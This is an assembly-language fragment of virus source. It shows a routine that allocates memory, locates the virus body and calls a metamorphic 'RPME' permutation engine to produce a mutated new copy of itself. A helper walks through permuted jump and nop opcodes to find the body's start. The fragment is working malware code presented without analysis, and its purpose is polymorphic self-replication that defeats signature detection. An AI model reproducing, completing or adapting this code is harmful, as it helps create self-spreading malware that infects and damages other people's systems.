
MAX_VIR_SIZE            equ     65536                   ; 4-aligned

build_new_copy:         pusha

                        mov     [ebp].v_memcount, 0     ; initialize heap

;                       ; install some pointers
;                       call    $+5
;                       pop     eax
;                       sub     eax, $-1-vir_start
;                       mov     [ebp].v_virptr, eax
;                       mov     [ebp].v_virsize, vir_size

                        push    MAX_VIR_SIZE
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      p_err
                        xchg    edi, eax

                        mov     [ebp].v_virptr, edi
                        mov     [ebp].v_virsize, MAX_VIR_SIZE

                        ;;
;                       push    0       ; OUT:etgsize
;                       mov     eax, esp
;
;                       pusho   my_random       ; external subroutine: rnd
;                       push    edi             ; ptr to output buffer
;                       push    64              ; max size of buffer
;                       push    13              ; max number of commands
;                       push    eax             ; ptr to generated bufsize
;                       push    REG_ALL         ; REG_xxx (dest)
;                       push    REG_ALL         ; REG_xxx (src)
;                       push    ETG_ALL         ; ETG_xxx (cmd)
;                       push    ebp             ; user_param
;                       call    etg_engine
;                       add     esp, 9*4
 ;
;                       pop     eax     ; etgsize
;                       add     edi, eax
                        ;;

                        call    get_vir_start_ptr ; returns ESI

                        pusho   my_malloc       ; malloc
                        pusho   my_disasm       ; disasm opcode
                        pusho   rpme_mutate     ; see usermut.inc
                        pusho   my_random       ; randomer
                        push    0               ; jmp-prob, 0=no jmps
                        push    0               ; extrelfix
                        push    0CCh            ; ofiller (-1=xparent)
                        push    0               ; *oentry
                        push    MAX_VIR_SIZE    ; osize
                        push    edi             ; obuf
                        push    0               ; ientry
                        push    MAX_VIR_SIZE    ; isize
                        push    esi             ; ibuf
                        push    ebp             ; user-param
                        call    rpme_kernel     ; call RPME kernel
                        add     esp, 14*4

                        cmp     eax, ERR_SUCCESS
                        jne     p_err

                        ;;
                        mov     esi, [ebp].v_virptr
                        mov     ecx, [ebp].v_virsize
                        add     ecx, 4
__skipcc:               sub     ecx, 4
                        cmp     dword ptr [esi+ecx-4], 0CCCCCCCCh
                        je      __skipcc
                        mov     [ebp].v_virsize, ecx  ; still 4-aligned
                        ;;

                        popa
                        retn

p_err:                  int 3
                        jmp     p_err

                        ; 'coz body is permutated
get_vir_start_ptr:      call    __x2
                        call    vir_start
__x2:                   pop     esi

__x0:
                        mov     al, [esi]
                        cmp     al, 0E9h
                        jne     __x1
                        lodsb
                        lodsd
                        add     esi, eax
                        jmp     __x0
__x1:                   cmp     al, 90h
                        jne     __x3
                        lodsb
                        jmp     __x0
__x3:                   cmp     al, 89h
                        jne     __x4
__x5:                   lodsw
                        jmp     __x0
__x4:                   cmp     al, 8Bh
                        je      __x5
                        cmp     al, 87h
                        je      __x5

                        lodsb           ; skip <call vir_start>
;                       cmp     al, 0E8h
;                       jne     $
                        lodsd
                        add     esi, eax

                        retn
